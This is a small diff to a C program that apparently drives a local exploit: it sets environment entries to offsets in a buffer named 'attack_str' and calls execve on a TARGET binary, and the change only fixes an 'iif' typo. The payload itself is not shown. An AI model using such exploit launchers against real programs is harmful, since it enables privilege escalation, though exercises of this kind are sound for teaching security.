@@ -77,7 +77,7 @@ int main ( int argc, char * argv[] ) {
 	env[4] = &attack_str[287];
 	env[5] = NULL;
 
-	iif ( execve (TARGET, args, env) < 0 )
+	if ( execve (TARGET, args, env) < 0 )
 		fprintf (stderr, "execve failed.\n");
 
 	return (0);
